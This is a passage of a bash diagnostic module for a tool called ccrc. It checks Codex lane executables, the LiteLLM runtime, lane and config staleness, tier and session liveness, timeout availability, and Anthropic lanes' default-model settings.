        echo "FIX codex: tiers: this fix replaced code a running tier runs (the shim or the runtime), so it re-ran the install step 'ccrc update' runs, which restarts every running ccrc-owned tier that measures stale, on any lane (its lines above)"
      else
        echo "FIX codex: tiers: this fix replaced code a running tier runs (the shim or the runtime), so it re-ran the install step 'ccrc update' runs, and that step could not restart every stale tier (its lines above say which)"
      fi
    fi
    echo "FIX codex: done for ${#ids[@]} codex lane(s) — no port, roster row, OAuth, credential, unidentified listener or unit enablement was touched; the re-measurement below is the verdict"
    exit 0
  )
}

# `_check_codex`'s findings, recorded into the caller's DRX_CLASS/DRX_WHAT/
# DRX_FIX (bash's dynamic scope: they are `local` to `_check_codex`) and
# printed by `_dr_cx_report`, so each is one sentence plus its own remedy.
_dr_cx_find()   { DRX_CLASS+=("$1"); DRX_WHAT+=("$2"); DRX_FIX+=("$3"); }
_dr_cx_fail()   { _dr_cx_find FAIL "$1" "$2"; }
_dr_cx_warn()   { _dr_cx_find WARN "$1" "$2"; }
_dr_cx_member() { local x="$1" y; shift; for y in "$@"; do [ "$y" = "$x" ] && return 0; done; return 1; }
_dr_cx_join()   { local sep="$1" out="" x; shift; for x in "$@"; do out+="${out:+$sep}$x"; done; printf '%s' "$out"; }

# Every FAIL line, then every WARN line, each with its own remedy; the return
# code is the worst class printed (cmd_doctor cross-checks the two, and a
# disagreement is its own FAIL). PASS only when nothing was found at all.
_dr_cx_report() {   # <PASS detail>
  local i worst=0
  if [ "${#DRX_CLASS[@]}" -eq 0 ]; then
    _dr_pass codex "$1"
    return 0
  fi
  for i in "${!DRX_CLASS[@]}"; do
    [ "${DRX_CLASS[$i]}" = FAIL ] || continue
    _dr_fail codex "${DRX_WHAT[$i]}" "${DRX_FIX[$i]}"; worst=1
  done
  for i in "${!DRX_CLASS[@]}"; do
    [ "${DRX_CLASS[$i]}" = WARN ] || continue
    _dr_warn codex "${DRX_WHAT[$i]}" "${DRX_FIX[$i]}"; [ "$worst" -eq 1 ] || worst=2
  done
  return "$worst"
}

# The four GPT-lane executables against the SHIPPED TREE, byte for byte —
# `_check_skills`' rule (the tree the stamp names, `$BOX_TREE_DIR/ccd`), with
# `cmp` where that check uses `diff`. `CODEX_LANE_BINS` is `_inst_bins`'
# GPT-lane gate, in its order, declared ONCE at file level so `_fix_codex`
# (Task 8) restores exactly what this compares. ccrc-doctor.test.ts pins this
# one line to `GPT_LANE_BINS`, which ccrc-install.test.ts pins to the gate
# itself, so a fifth executable or a rename reds there before this list can drift.
CODEX_LANE_BINS=(ccgpt-proxy.py ccgpt-usage.py ccgpt-runtime ccrc-codex)
_dr_cx_bins() {
  local tree="$BOX_TREE_DIR/ccd" bin="$HOME/.local/bin" name have_cmp=1
  local -a notree=() missing=() drift=() uncompared=()
  # Plan 3b Task A5, D-4052: no `cmp` costs the BYTE compare only. A file missing
  # from the shipped tree or from ~/.local/bin, or not executable, is a fact
  # `cmp` plays no part in, and is FAILed by name whatever PATH holds; the
  # early return this replaced swallowed it, and with it the only FAIL that
  # lets `_fix_codex` (FAIL-only, R-C8) place the file. A file left
  # uncompared is named in its own WARN, never claimed current.
  command -v cmp >/dev/null 2>&1 || have_cmp=0
  for name in "${CODEX_LANE_BINS[@]}"; do
    if [ ! -f "$tree/$name" ]; then notree+=("$name"); continue; fi
    if [ ! -f "$bin/$name" ] || [ ! -x "$bin/$name" ]; then missing+=("$name"); continue; fi
    if [ "$have_cmp" -eq 0 ]; then uncompared+=("$name"); continue; fi
    cmp -s "$tree/$name" "$bin/$name" || drift+=("$name")
  done
  [ "${#notree[@]}" -eq 0 ] || _dr_cx_fail "the shipped tree ($tree) has no $(_dr_cx_join ', ' "${notree[@]}"), so nothing on this box says what the GPT-lane executables should be" \
    "run 'ccrc update' (or 'ccrc install' from a checkout) to place the shipped tree"
  [ "${#missing[@]}" -eq 0 ] || _dr_cx_fail "$(_dr_cx_join ', ' "${missing[@]}") missing from \$HOME/.local/bin, or not executable — every Codex lane needs all four" \
    "run 'ccrc update' (or 'ccrc install' from a checkout): it places them from the shipped tree on every role but server"
  [ "${#drift[@]}" -eq 0 ] || _dr_cx_fail "$(_dr_cx_join ', ' "${drift[@]}") in \$HOME/.local/bin differ from the shipped tree's copies in $tree, so a lane would run bytes this build did not ship" \
    "run 'ccrc update' (or 'ccrc install' from a checkout): it re-places them from the shipped tree"
  [ "${#uncompared[@]}" -eq 0 ] || _dr_cx_warn "cmp is not on PATH, so $(_dr_cx_join ', ' "${uncompared[@]}") in \$HOME/.local/bin could not be compared with the shipped tree — unmeasured, not current" \
    "install diffutils (it ships cmp), then re-run doctor"
  return 0
}

# The isolated runtime, by `ccgpt-runtime check` — one word per failure, each
# its own sentence and remedy. A `ccgpt-runtime` that is not there is the
# executables row's finding, said there once.
_dr_cx_runtime() {
  local cli ans rc
  cli="$(_codex_runtime_cli)"
  [ -x "$cli" ] || return 0
  ans="$("$cli" check 2>&1)"; rc=$?
  case "$rc:$ans" in
    "0:ccgpt-runtime: current "*) DRX_RUNTIME="${ans#ccgpt-runtime: current }" ;;
    "1:ccgpt-runtime: absent")
      _dr_cx_fail "no isolated LiteLLM runtime is current on this box (ccgpt-runtime check: absent), so no Codex lane can start its tiers" \
        "build it: ccgpt-runtime build (ccrc install and ccrc update run the same build)" ;;
    "1:ccgpt-runtime: requirement-moved")
      _dr_cx_fail "the current runtime generation was built for another LiteLLM requirement than this ccrc declares (ccgpt-runtime check: requirement-moved), so it is out of the range this build was probed against" \
        "rebuild it: ccgpt-runtime build — it builds, probes and swaps in a generation for the declared range, and the old one stays current until the new one passes" ;;
    "1:ccgpt-runtime: probe-moved")
      _dr_cx_fail "the current runtime generation passed an older behaviour probe than the one this ccrc ships (ccgpt-runtime check: probe-moved), so what it was proven to do is not what this build checks" \
        "rebuild it: ccgpt-runtime build — it re-runs the shipped probe against a fresh generation" ;;
    "1:ccgpt-runtime: mutated")
      _dr_cx_fail "the current runtime generation no longer matches its stamp (ccgpt-runtime check: mutated): its interpreter, its stamp or its installed LiteLLM changed after the build" \
        "rebuild it: ccgpt-runtime build — a mutated generation is never repaired in place" ;;
    *)
      _dr_cx_fail "ccgpt-runtime check answered something this doctor does not know (exit $rc: $(_dr_first_line "$ans")), so the runtime's state is unmeasured" \
        "ccrc and ccgpt-runtime ship together and must be one build: run 'ccrc update', then re-run doctor" ;;
  esac
  return 0
}

# One lane's static rows. Its row already read in `_check_codex`'s row pass;
# it is read again HERE so this shell's CX_* are this lane's.
_dr_cx_lane() {   # <id> <models: 1 = its model state is measurable> <roster> — sets DRX_LANE_WORDS
  local id="$1" models="$2" roster="$3" auth st ans lc yaml
  local -a f=()
  DRX_LANE_WORDS=''
  _codex_row "$id" 2>/dev/null || return 0
  DRX_LANE_WORDS="ports $CX_PROXY/$CX_LITELLM"
  # authDir: EXISTENCE AND MODE ONLY (spec §9, §12). `[ -f ]` needs search
  # permission on the directory and nothing on the file, so a 0000 auth.json
  # passes: its contents are never this check's business.
  auth="$HOME/$CX_AUTH"
  if [ ! -e "$auth" ] && [ ! -L "$auth" ]; then
    _dr_cx_fail "$id's authDir ~/$CX_AUTH does not exist, so the lane has nothing to sign in to" \
      "sign the lane in: ccrc codex login $id (the runtime's own login creates it, owner-only) — ccrc never performs OAuth for you"
  elif [ ! -d "$auth" ] || [ ! -r "$auth" ] || [ ! -x "$auth" ]; then
    _dr_cx_fail "$id's authDir ~/$CX_AUTH is not a directory this user can list and search, so whether the lane is signed in cannot be told" \
      "make it a directory you own and can search (chmod u+rx ~/$CX_AUTH); ccrc never reads what is inside it"
  elif [ ! -f "$auth/auth.json" ]; then
    _dr_cx_fail "$id has no OAuth login: ~/$CX_AUTH holds no auth.json (existence is all ccrc checks; it never reads one), so 'ccrc codex start $id' refuses" \
      "sign the lane in: ccrc codex login $id"
  else
    DRX_LANE_WORDS+=", signed in"
  fi
  # lane.json against the ROSTER row: id, configDir, authDir, both ports, unit names present.
  st="$(_codex_lane_json_state "$id" 2>/dev/null)" || st=''
  case "$st" in
    current) ;;
    absent)
      _dr_cx_fail "$id has no lane.json ($(_codex_lane_dir "$id")/lane.json), which the launcher, the shim and the usage publisher all read" \
        "render it: ccrc codex start $id renders lane.json from the roster before it starts the lane (every session launch runs the same start)" ;;
    stale)
      _dr_cx_fail "$id's lane.json disagrees with its roster row (its id, configDir, authDir, a port or its unit names), so the shim and the usage publisher read the lane's old shape" \
        "re-render it: ccrc codex start $id renders lane.json from the roster before it starts the lane" ;;
    *)
      _dr_cx_fail "whether $id's lane.json matches its roster row could not be measured" \
        "run: ccrc codex status $id — it reads the same file and says what it could see" ;;
  esac
  if [ "$models" -ne 1 ]; then DRX_LANE_WORDS+=", model state unread"; return 0; fi
  # The lane's model state, ONLY through models-op's `show`.
  ans="$(_models_node show --file "$roster" --id "$id" 2>/dev/null)"
  mapfile -t f < <(printf '%s' "$ans" | jq -r '
      if .ok != true then error("refused") else . end
      | (.registry | if type == "object" then . else null end) as $r
      | (if $r == null then null else $r.classes.haiku end) as $h
      | (if $r == null then "none" else ($r.probe // "" | tostring) end),
        ($h // "" | tostring),
        (if $r == null then "" else ($r.subagent // "" | tostring) end),
        (if ($h | type) == "string" and ((.derived.retired // []) | any(. == $h)) then "retired" else "live" end),
        (.renderRefusal // "" | tostring | gsub("[\n\t]"; " ")),
        "END"' 2>/dev/null)
  if [ "${#f[@]}" -ne 6 ] || [ "${f[5]}" != END ]; then
    if printf '%s' "$ans" | jq -e '.ok == false' >/dev/null 2>&1; then
      _dr_cx_fail "$id: 'ccrc models' refused to read the lane's model state — $(printf '%s' "$ans" | jq -r '"\(.error // "?"): \(.detail // "" | gsub("[\n\t]"; " "))"' 2>/dev/null)" \
        "fix what that sentence names, then re-run doctor"
    else
      _dr_cx_fail "$id: 'ccrc models' printed no answer about the lane (deploy/models-op.mjs), so its class registry and catalogue are unmeasured" \
        "ccrc and deploy/models-op.mjs ship together and must be one build: run 'ccrc update', then re-run doctor"
    fi
    return 0
  fi
  local probe="${f[0]}" haiku="${f[1]}" sub="${f[2]}" ret="${f[3]}" refusal="${f[4]}"
  if [ "$probe" = none ]; then
    _dr_cx_fail "$id is a Codex lane with no class registry, so nothing says which model any class routes to, and its probe model and LiteLLM config have nothing to be rendered from" \
      "create it: ccrc models $id init codex, then ccrc models refresh $id"
    return 0
  fi
  if [ "$probe" != codex ]; then
    _dr_cx_fail "$id is a Codex lane whose class registry declares probe \"$probe\": that is another provider's catalogue, and a LiteLLM config rendered from it would name models the ChatGPT backend has never heard of" \
      "remove that registry deliberately (ccrc models $id rm) and create the lane's own: ccrc models $id init codex — ccrc never changes a registry's probe kind for you"
    return 0
  fi
  [ -z "$refusal" ] || _dr_cx_fail "$id's model files cannot be rendered: $refusal" \
    "fix the class that sentence names (ccrc models $id show prints the registry), then re-run doctor"
  if [ -z "$haiku" ]; then
    _dr_cx_warn "$id routes haiku to nothing, so its lane.json carries no probe model and its usage publisher refuses to publish" \
      "assign one: ccrc models $id set-class haiku <modelId>"
  elif [ "$ret" = retired ]; then
    _dr_cx_warn "$id's usage probe model, $haiku (its haiku class), is absent from the lane's current catalogue, so the usage publisher probes a model the backend no longer lists" \
      "reassign it: ccrc models $id set-class haiku <modelId> (ccrc models $id show lists the catalogue)"
  fi
  # lane.json against the REGISTRY (ruling R7): the check-only materialise.
  # Asked only over a lane.json the roster row agrees with — a stale or absent
  # one is already its own FAIL above, with its own remedy.
  if [ "$st" = current ]; then
    lc="$(_models_node materialise --file "$roster" --id "$id" --check true 2>/dev/null \
          | jq -r 'if .ok == true and .check == true then (.changed.lane | tostring) else "error:\(.error // "no answer")" end' 2>/dev/null)"
    case "$lc" in
      false) DRX_LANE_WORDS+=", lane.json current" ;;
      true)
        _dr_cx_fail "$id's lane.json is stale against its class registry: the registry has moved (its haiku class, which is the lane's probe model, or another field lane.json carries) since the file was written" \
          "re-render it: ccrc models $id set-subagent ${sub:-sonnet} (any models mutation re-renders the lane's files, lane.json among them)" ;;
      *)
        _dr_cx_fail "whether $id's lane.json matches its class registry could not be measured ('ccrc models' answered ${lc:-nothing})" \
          "ccrc and deploy/models-op.mjs ship together and must be one build: run 'ccrc update', then re-run doctor" ;;
    esac
  fi
  # The rendered LiteLLM config against the CATALOGUE: models-op's `litellm`
  # without `--commit` is check-only — it answers `changed` and writes nothing.
  yaml="$(_codex_litellm_yaml "$id")"
  lc="$(_models_node litellm --file "$roster" --id "$id" --template "$(_models_litellm_template)" --out "$yaml" 2>/dev/null \
        | jq -r 'if .ok == true then "changed:\(.changed)" else "refused:\(.error // ""):\(.detail // "" | gsub("[\n\t]"; " "))" end' 2>/dev/null)"
  case "$lc" in
    changed:false) DRX_LANE_WORDS+=", LiteLLM config current" ;;
    changed:true)
      if [ -e "$yaml" ] || [ -L "$yaml" ]; then
        _dr_cx_fail "$id's LiteLLM config ($yaml) is stale against the lane's catalogue: a render now would write different bytes, so the lane's LiteLLM routes a model list the catalogue has moved past" \
          "re-render it: ccrc models litellm $id (it stops the lane's own LiteLLM tier around the write when that tier is running, and starts it again)"
      else
        _dr_cx_fail "$id has no rendered LiteLLM config ($yaml), so the lane's LiteLLM tier has nothing to start on" \
          "render it: ccrc models litellm $id (ccrc codex start $id renders it too when it is absent)"
      fi ;;
    refused:never-probed:*)
      _dr_cx_fail "$id has never been probed, so there is no catalogue for its LiteLLM config to be rendered from" \
        "probe it: ccrc models refresh $id" ;;
    refused:*)
      _dr_cx_fail "$id: 'ccrc models' refused to render the lane's LiteLLM config — ${lc#refused:}" \
        "fix what that sentence names, then re-run doctor" ;;
    *)
      _dr_cx_fail "whether $id's LiteLLM config is current could not be measured ('ccrc models' printed no answer)" \
        "ccrc and deploy/models-op.mjs ship together and must be one build: run 'ccrc update', then re-run doctor" ;;
  esac
  return 0
}

# ── _check_codex, part 2: the tier rows (spec §12; Plan 3a Task 5) ────────
# THE QUESTION IS THE LIBRARY'S. `_codex_tier_ours` (ccd/ccrc) answers each
# tier — 0 ours running, 1 not running, 2 foreign (CX_TIER_WHY), 3 cannot ask,
# 4 ours starting — through the SAME probes `ccrc codex status` asks:
# `_codex_port_listening` and `_codex_lane_answer`, each a loopback connect
# under `_plat_timeout "$(_codex_probe_secs)"` (CCRC_CODEX_PROBE_S, default
# 2 s). So a listener that accepts and never answers costs this check its
# bound, never a hang (ruling R-C4: doctor MAY connect to a lane's loopback
# ports, bounded). Every 2 is worded by `_codex_foreign_what`, the one helper
# every rc-2 consumer names through, and NOTHING here signals, stops or
# starts anything: a foreign listener is named and left running.
#   - a 2 whose CX_TIER_WHY is `unit-unproven` is a WARN with that helper's
#     retry wording, never a FAIL: this lane's own tier reads exactly so
#     inside its RestartSec window (D-3714);
#   - a 2 that `_codex_tier_is_our_handle` reads as this lane's own process
#     (`listener-other-process`) is a FAIL in the helper's words alone: that
#     sentence names the pid it proved, so it never says "cannot identify";
#   - a 3 is a WARN, unmeasured — never read as running or as stopped
#     (D-3715);
#   - a lane is LAZY, so both tiers down is a PASS; one up and one down is
#     the FAIL §12 names;
#   - `_codex_tier_stale` answers 0 stale, 1 current, 2 cannot tell, and a 2
#     is its own WARN — never current, never stale;
#   - a LiteLLM tier down under a live session is a WARN (2b-2's hazard: a
#     tier that died after a start that wrote stays down until the next
#     start, D-3716).
_dr_cx_tiers() {   # <id> — sets DRX_TIER_WORDS
  local id="$1" tier q word own lq=3 sq=3 unread='' refix=''
  local -a words=()
  for tier in $CODEX_TIERS; do
    CX_LISTEN_WHY=''
    _codex_tier_ours "$id" "$tier" 2>/dev/null; q=$?
    case "$q" in
      0|4)
        word="$tier running"; [ "$q" -eq 4 ] && word="$tier starting"
        # CX_TIER_* read NOW: the next question overwrites them.
        words+=("$word${CX_TIER_VIA:+ ($CX_TIER_VIA${CX_TIER_PID:+, pid $CX_TIER_PID})}")
        _codex_tier_stale "$id" "$tier"
        case $? in
          1) ;;
          # `_codex_tier_stale`'s 0 is "the record differs from what a start
          # would write now", and an absent, unreadable or unparseable record
          # differs too, so the sentence names every cause it cannot tell apart.
          0) _dr_cx_warn "$id's $tier tier is running, and is not proven to run the installed bytes: its start record ($(_codex_lane_dir "$id")/$tier.started) is absent, unreadable or unparseable, or it names another runtime generation, or another placed shim, than a start would use now" \
               "restart it onto the installed bytes: 'ccrc update' restarts a running, proven, stale ccrc tier; by hand, 'ccrc codex stop $id' then 'ccrc codex start $id'" ;;
          *) _dr_cx_warn "$id's $tier tier is running, and whether it runs the installed bytes cannot be told (no current runtime generation, or the tier's code file cannot be hashed) — unmeasured, not current" \
               "make the runtime current (the runtime finding, if any, names how), then re-run doctor" ;;
        esac ;;
      1) words+=("$tier not running") ;;
      2)
        # Asked FIRST, directly after `_codex_tier_ours`, as its contract says.
        own=1; _codex_tier_is_our_handle "$q" && own=0
        words+=("$tier foreign")
        _codex_foreign_what "$id" "$tier"
        if [ "${CX_TIER_WHY:-}" = unit-unproven ]; then
          _dr_cx_warn "$id: $CX_FOREIGN_WHAT" "$CX_FOREIGN_FIX"
        elif [ "$own" -eq 0 ]; then
          _dr_cx_fail "$id: $CX_FOREIGN_WHAT" "$CX_FOREIGN_FIX"
        else
          _dr_cx_fail "$id: $CX_FOREIGN_WHAT — ccrc neither adopts nor stops what it cannot identify" "$CX_FOREIGN_FIX"
        fi ;;
      *)
        words+=("$tier unmeasured")
        _dr_cx_warn "$id's $tier tier could not be measured${CX_LISTEN_WHY:+ ($CX_LISTEN_WHY)} — unmeasured, never read as running or as stopped" \
          "run: ccrc codex status $id — it asks the same question and says what it could see" ;;
    esac
    if [ "$tier" = litellm ]; then lq="$q"; else sq="$q"; fi
  done
  case "$lq:$sq" in
    [04]:1)
      _dr_cx_fail "$id is half up: its LiteLLM tier is running and its shim is not, so every request a session sends this lane fails before it reaches LiteLLM" \
        "start the tier that is down: ccrc codex start $id (idempotent: it starts only what is not running)" ;;
    1:[04])
      _dr_cx_fail "$id is half up: its shim is running and its LiteLLM tier is not, so every request the shim forwards fails" \
        "start the tier that is down: ccrc codex start $id (idempotent: it starts only what is not running)" ;;
  esac
  if [ "$lq" = 1 ]; then
    _dr_cx_sessions "$id"
    if [ "$DRX_LIVE" -gt 0 ]; then
      _dr_cx_warn "$id's LiteLLM tier is not running while $DRX_LIVE live session(s) run on this lane, so every turn they send fails at the gateway — a tier that died after its start stays down until the next start" \
        "start it: ccrc codex start $id (every session launch runs the same start)"
    elif [ "$DRX_UNASKED" -gt 0 ]; then
      [ "$DRX_UNREADABLE" -eq 0 ] || { unread="; $DRX_UNREADABLE of them: \$HOME/.cc-sessions/$DRX_UNREADABLE_SID.wrapper cannot be read by this user, so which lane that session runs on is unknown"; refix="read or fix that file's mode (ccd writes it), and "; }
      _dr_cx_warn "$id's LiteLLM tier is not running, and whether any of this lane's registered sessions is live could not be asked ($DRX_UNASKED unanswered) — unmeasured, not idle$unread" \
        "${refix}ask by hand${DRX_UNASKED_SID:+ ($(_svc_status_hint "claude-session@$DRX_UNASKED_SID.service"))}; if one is live, start the lane: ccrc codex start $id"
    fi
  fi
  if [ "$lq:$sq" = 1:1 ]; then
    DRX_TIER_WORDS="tiers: none running (a lane is lazy)"
  else
    DRX_TIER_WORDS="tiers: $(_dr_cx_join ', ' "${words[@]}")"
  fi
}

# The lane's LIVE sessions: `~/.cc-sessions/<sid>.wrapper` names the account a
# session runs on (ccd's registry field, read here as a file and never
# written), and `_svc_is_active claude-session@<sid>.service` whether it runs
# — three answers, as `_check_routing`'s census has: live, measured not-live,
# and NOT ASKED (the manager printed no word), which is never folded into
# not-live. `[ -f ]` first, so a FIFO planted at a `.wrapper` path is never
# opened (D-2380's class).
# AN UNREADABLE `.wrapper` IS NOT ANOTHER LANE'S (Plan 3b Task A5, D-4052): it is a
# session that may be on this lane, counted into DRX_UNASKED (the "could not tell" word),
# never into DRX_LIVE and never skipped, and named apart in DRX_UNREADABLE(_SID): its remedy
# is the file's mode, never the manager (D-4052). Whether it was READ is the redirection's
# answer, not `read`'s: ccd writes the field with `printf '%s'` (`_reg_set`), no trailing
# newline, so `read` returns 1 on every real wrapper while still setting `w`. Spelled POSITIVE on purpose:
# under bash 5.2 `if ! { …; } 2>/dev/null < f` takes the readable branch when
# the open fails (measured), and `2>/dev/null` sits before the `<` so bash's
# own "Permission denied" never reaches doctor's output.
_dr_cx_sessions() {   # <id> — sets DRX_LIVE, DRX_UNASKED, DRX_UNASKED_SID, DRX_UNREADABLE, DRX_UNREADABLE_SID
  local id="$1" reg="$HOME/.cc-sessions" wf w sid
  DRX_LIVE=0; DRX_UNASKED=0; DRX_UNASKED_SID=''; DRX_UNREADABLE=0; DRX_UNREADABLE_SID=''
  [ -d "$reg" ] || return 0
  if [ ! -r "$reg" ] || [ ! -x "$reg" ]; then DRX_UNASKED=1; return 0; fi
  for wf in "$reg"/*.wrapper; do
    [ -f "$wf" ] || continue
    sid="${wf##*/}"; sid="${sid%.wrapper}"
    w=''
    if { IFS= read -r w || :; } 2>/dev/null < "$wf"; then
      [ "$w" = "$id" ] || continue
    else
      DRX_UNASKED=$((DRX_UNASKED + 1)); DRX_UNREADABLE=$((DRX_UNREADABLE + 1)); [ -n "$DRX_UNREADABLE_SID" ] || DRX_UNREADABLE_SID="$sid"
      continue
    fi
    case "$(_svc_is_active "claude-session@$sid.service")" in
      active|activating|reloading|refreshing|deactivating) DRX_LIVE=$((DRX_LIVE + 1)) ;;
      '') DRX_UNASKED=$((DRX_UNASKED + 1)); [ -n "$DRX_UNASKED_SID" ] || DRX_UNASKED_SID="$sid" ;;
    esac
  done
  return 0
}

# ── timeout: the bound the session hook and the status line put on tmux ──
# APPENDED HERE, not beside `_check_flock` where it belongs by kind: lines in
# this file are cited by number from `ccrc` and the tests, and a function
# inserted mid-file would move every one of them. Its table entry shares
# `flock`'s line for the same reason.
#
# WHY IT IS A CHECK AT ALL. `ccd/session-hook.sh` and `ccd/statusline-command.sh`
# each ask tmux one question — which session is this pane in — bounded by
# `timeout` or, failing that, `gtimeout` (Homebrew's coreutils spelling; macOS
# ships no `timeout`). With NEITHER on PATH each SKIPS the question rather
# than asking it unbounded (the comments above each file's tmux call argue
# why), and the consequence is total and silent: the hook exits before every
# arm — no hookstate, no turn marker, no search-gate or worker-merge deny, no
# SessionStart card — and the status line writes no usage sidecar, for every
# session on the box, with no error anywhere. `ccd`
# and `ccrc` are not the subject — their `_plat_timeout` carries a bash
# fallback; these two files are installed alone and carry only its selection
# arm. FAIL, because nothing on the box reports the loss otherwise and the
# board falls back to reading panes.
#
# SKIP on a `server`-role box: it hosts no sessions, so neither file runs there
# (the D-3111 reading every per-session check here takes). The name found is
# the name PASSed, `timeout` before `gtimeout` — the two files' own order.
#
# THE CHECK NAME IS QUOTED in the verdict calls below, unlike every other
# check's: `macos-platform.test.ts` scans this file for a bare GNU `timeout`
# call, and `_dr_pass timeout "…"` reads as one. `"timeout"` does not.
_check_timeout() {
  local _srv_role="" bin p
  [ -f "${BOX_ENV_FILE:-}" ] && [ -r "${BOX_ENV_FILE:-}" ] && _srv_role="$(_box_env_value "$BOX_ENV_FILE" CCRC_ROLE)"
  if [ "$_srv_role" = server ]; then
    _dr_skip "timeout" "this box records CCRC_ROLE=server, so it hosts no sessions and neither the session hook nor the status line runs here"
    return 3
  fi
  for bin in timeout gtimeout; do
    p="$(command -v "$bin" 2>/dev/null)"
    if [ -n "$p" ]; then
      _dr_pass "timeout" "$bin at $p"
      return 0
    fi
  done
  local remedy="install GNU coreutils: sudo apt install coreutils"
  [ "${CCD_OS:-linux}" = darwin ] && remedy="install GNU coreutils: brew install coreutils (it installs timeout as gtimeout)"
  _dr_fail "timeout" "neither timeout nor gtimeout is on PATH — the session hook and the status line bound their one tmux call with one of them and, with neither, skip it: the hook then does nothing at all (no hookstate, no turn marker, no search-gate or worker-merge deny, no SessionStart card) and the status line writes no usage sidecar, for every session on this box, silently" \
    "$remedy"
}

# ── model-default: an Anthropic lane whose settings.json defaults to Fable ──
# APPENDED HERE, with its table entry on `routing`'s line, for `_check_timeout`'s
# reason: lines in this file are cited by number from `ccrc`, the tests and the
# docs, and a function inserted mid-file would move every one of them.
#
# WHY IT IS A CHECK AT ALL. Claude Code's `/model <name>` answers "Set model to
# … and saved as your default for new sessions" and writes `model` into that
# account home's settings.json. ccd composes `--model <class>` only from a
# routing record whose class is set and is not `default` (`_spawn_start`); every
# other spawn — no record, class `default`, a dispatched worker whose run names
# no class — leaves the model to "the lane's own settings", which is that key.
# So one stray `/model fable` makes every such session on the lane start on
# Fable, although ccrc's routing never chooses Fable itself
# (`shared/routing-ladder.ts`'s MAIN_CLASS_CEILING). ccd's own picker apply
# (`_route_type_model`) presses `s` on a picker row — "for this session only" —
# and is not a writer of the key.
#
# WHAT IS READ — Claude Code's own precedence below `--model` (2.1.291's
# `Sy()` then `WHe()`): `env.ANTHROPIC_MODEL`, else `model`, else
# `env.ANTHROPIC_DEFAULT_MODEL`, each only when it is a non-empty string. The
# value is normalised as Claude Code's resolver (`xt`) normalises it — trimmed,
# case-folded, a trailing `[1m]` stripped in any case — and is Fable-class when
# that alias is `fable`, when it is `best` (which resolves to the Fable default
# on a lane entitled to Fable, and says so), when the raw value carries
# `-fable-` (the dash-token rule of `familyClassOf` in `shared/models.mjs` and
# ccd's `_model_family_class`: the Fable token is the FIRST in that table, so
# "contains `-fable-`" is exactly "familyClassOf answers fable"; a full id is
# not case-folded there, nor here), or when any other alias resolves through
# the lane's own `env.ANTHROPIC_DEFAULT_<ALIAS>_MODEL` remap to such an id (the
# key is BUILT from the alias, not listed). NOT read: the remap of the
# account's implicit default when no rung names a model — which alias that is
# depends on the account, so it is unmeasured here, not guessed. This follows
# Claude Code, not ccd's `_model_class_of` (which classifies a `/model`
# argument read from a transcript). ONLY THE FABLE SPELLINGS ARE TYPED HERE:
# `single-definition.test.ts` reds a file whose code spells all four class
# words, this file's code already spells `haiku` in the form that scan counts,
# and this check adds `fable` — so the remedy below names Opus capitalised,
# which the scan does not count. Claude Code case-folds the alias (`xt`'s
# `toLowerCase()`), so `Opus` typed as written resolves exactly as `opus`.
#
# ONLY ANTHROPIC-BACKEND LANES (`CCRC_ANTHROPIC_BACKEND`): on a codex lane the
# `fable` alias resolves through ANTHROPIC_DEFAULT_FABLE_MODEL to a GPT model,
# a different slot and not this concern.
#
# WARN, NEVER FAIL: `cmd_install` ends with `cmd_doctor`, and a FAIL there
# aborts `ccrc update` before its supervisor sweep (`_check_routing`'s S1-R13
# comment) — and ccrc does not own the `model` key, so there is no `--fix` arm
# either. A settings.json that exists but cannot be read or does not parse is
# its own WARN, UNMEASURED, one line per condition (a mode fix and a JSON fix
# are different remedies) — never folded into the PASS; so is a reader (node)
# that fails, and a lane the projection gives no config dir. An ABSENT one sets
# no default, which is a measured answer.
#
# SKIP on a `server`-role box: it hosts no sessions (D-3111).
_check_model-default() {
  local _srv_role=""
  [ -f "${BOX_ENV_FILE:-}" ] && [ -r "${BOX_ENV_FILE:-}" ] && _srv_role="$(_box_env_value "$BOX_ENV_FILE" CCRC_ROLE)"
  if [ "$_srv_role" = server ]; then
    _dr_skip model-default "this box records CCRC_ROLE=server, so it hosts no sessions and no lane's default model on it is ccrc's concern"
    return 3
  fi
  local sh="$HOME/.ccrc/accounts.sh" raw="" a d f out rc n=0 fab="" unread="" unparsed="" nodefail="" nodir="" why nl=$'\n'
  if [ ! -e "$sh" ]; then
    _dr_pass model-default "0 Anthropic lane(s): no roster projection at \$HOME/.ccrc/accounts.sh, so no lane's settings.json was measured (the wrappers check owns the roster's health)"
    return 0
  fi
  # A projection that is there but unreadable, does not source, or predates
  # the backend array is UNMEASURED — `_check_routing`'s S1-R9 reasoning: the
  # vacuous PASS below is reserved for an array that IS declared and empty.
  # It is sourced with its stdout discarded, so nothing it prints reaches
  # doctor's output or is read as a lane, and `#sourced` is printed only once
  # it has been sourced to the end with the array declared — so one that
  # `exit`s part-way is unmeasured too, not a roster with no Anthropic lane.
  [ -r "$sh" ] && raw="$( . "$sh" >/dev/null 2>&1 && declare -p CCRC_ANTHROPIC_BACKEND >/dev/null 2>&1 && printf '#sourced\n' \
    && for a in "${CCRC_ANTHROPIC_BACKEND[@]}"; do printf '%s\t%s\n' "$a" "$(_ccrc_cfg_dir "$a")"; done )"
  case "$raw" in
    '#sourced') raw="" ;;
    "#sourced$nl"*) raw="${raw#"#sourced$nl"}" ;;
    *) _dr_warn model-default "could not read the roster projection at \$HOME/.ccrc/accounts.sh, or it predates CCRC_ANTHROPIC_BACKEND, so which lanes are Anthropic lanes is unmeasured" \
         "re-run ccrc install to regenerate it, or check each Anthropic lane's settings.json by hand for a \`model\` (or env.ANTHROPIC_MODEL) of the Fable class"
       return 2 ;;
  esac
  if [ -z "$raw" ]; then
    _dr_pass model-default "0 Anthropic lane(s): the roster declares no Anthropic-backend account"
    return 0
  fi
  if ! command -v node >/dev/null 2>&1; then
    _dr_warn model-default "node is not on PATH, so no Anthropic lane's settings.json could be parsed" \
      "install Node first — see the 'node' check above"
    return 2
  fi
  while IFS=$'\t' read -r a d; do
    [ -n "$a" ] || continue
    if [ -z "$d" ]; then nodir="${nodir:+$nodir, }$a"; continue; fi
    n=$((n + 1)); f="$d/settings.json"
    [ -e "$f" ] || [ -L "$f" ] || continue
    # Parsed by node, as `_check_node` parses package.json (a box with no jq
    # gets one FAIL, from the jq check). Reading and parsing are separate
    # exits, so an unreadable file and a corrupt one stay two conditions:
    #   exit 5 = cannot be read ("READERR:<code>"); exit 3 = not JSON;
    #   exit 4 = JSON but not an object; exit 7 = Fable-class ("<key>=<value>");
    #   exit 0 = measured, not Fable-class.
    out="$(CCRC_DOCTOR_SETTINGS="$f" node -e '
      const fs = require("fs");
      let text;
